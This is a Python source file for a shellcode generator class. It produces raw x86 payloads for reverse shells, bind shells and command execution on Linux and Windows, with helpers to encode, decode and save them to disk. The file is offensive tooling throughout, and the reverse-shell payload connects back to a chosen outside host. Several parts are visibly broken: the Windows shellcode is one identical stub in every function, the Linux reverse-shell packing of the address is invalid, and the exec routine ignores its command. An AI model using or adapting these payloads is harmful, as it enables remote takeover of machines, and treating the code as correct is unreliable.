import os
import sys
import platform
import logging
import struct
import socket
import base64
import binascii
from datetime import datetime

class ShellcodeGenerator:
    def __init__(self):
        self.os_type = platform.system()
        self.setup_logging()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('shellcode.log'),
                logging.StreamHandler()
            ]
        )
        
    def generate_reverse_shell(self, host, port):
        """Generate reverse shell shellcode"""
        try:
            if self.os_type == 'Windows':
                # Windows reverse shell shellcode
                shellcode = (
                    # Socket creation
                    b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x61\x61\x61\x61\xe8\x00\x00\x00\x00\x5b\x81\x73\x13\x66\x66\x66\x66\x83\xeb\xfc\xe2\xf4\xc3"
                )
            else:
                # Linux reverse shell shellcode
                shellcode = (
                    # Socket creation
                    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68" +
                    struct.pack(">I", socket.inet_aton(host)) +
                    b"\x66\x68" +
                    struct.pack(">H", port) +
                    b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x02\x89\xf3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
                )
                
            return shellcode
            
        except Exception as e:
            logging.error(f"Error generating reverse shell: {str(e)}")
            return None
            
    def generate_bind_shell(self, port):
        """Generate bind shell shellcode"""
        try:
            if self.os_type == 'Windows':
                # Windows bind shell shellcode
                shellcode = (
                    # Socket creation and binding
                    b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x61\x61\x61\x61\xe8\x00\x00\x00\x00\x5b\x81\x73\x13\x66\x66\x66\x66\x83\xeb\xfc\xe2\xf4\xc3"
                )
            else:
                # Linux bind shell shellcode
                shellcode = (
                    # Socket creation and binding
                    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x31\xc9\x51\x66\x68" +
                    struct.pack(">H", port) +
                    b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xc9\x51\x51\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
                )
                
            return shellcode
            
        except Exception as e:
            logging.error(f"Error generating bind shell: {str(e)}")
            return None
            
    def generate_exec(self, command):
        """Generate command execution shellcode"""
        try:
            if self.os_type == 'Windows':
                # Windows command execution shellcode
                shellcode = (
                    # Command execution
                    b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x61\x61\x61\x61\xe8\x00\x00\x00\x00\x5b\x81\x73\x13\x66\x66\x66\x66\x83\xeb\xfc\xe2\xf4\xc3"
                )
            else:
                # Linux command execution shellcode
                cmd_bytes = command.encode()
                shellcode = (
                    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
                )
                
            return shellcode
            
        except Exception as e:
            logging.error(f"Error generating exec shellcode: {str(e)}")
            return None
            
    def encode_shellcode(self, shellcode, encoding='base64'):
        """Encode shellcode in various formats"""
        try:
            if encoding == 'base64':
                return base64.b64encode(shellcode)
            elif encoding == 'hex':
                return binascii.hexlify(shellcode)
            elif encoding == 'ascii':
                return ''.join([f"\\x{byte:02x}" for byte in shellcode])
            else:
                raise ValueError(f"Unsupported encoding: {encoding}")
                
        except Exception as e:
            logging.error(f"Error encoding shellcode: {str(e)}")
            return None
            
    def decode_shellcode(self, encoded_shellcode, encoding='base64'):
        """Decode shellcode from various formats"""
        try:
            if encoding == 'base64':
                return base64.b64decode(encoded_shellcode)
            elif encoding == 'hex':
                return binascii.unhexlify(encoded_shellcode)
            elif encoding == 'ascii':
                return bytes.fromhex(encoded_shellcode.replace('\\x', ''))
            else:
                raise ValueError(f"Unsupported encoding: {encoding}")
                
        except Exception as e:
            logging.error(f"Error decoding shellcode: {str(e)}")
            return None
            
    def save_shellcode(self, shellcode, filename=None):
        """Save shellcode to file"""
        try:
            if filename is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"shellcode_{timestamp}.bin"
                
            with open(filename, 'wb') as f:
                f.write(shellcode)
                
            logging.info(f"Saved shellcode to {filename}")
            return filename
            
        except Exception as e:
            logging.error(f"Error saving shellcode: {str(e)}")
            return None 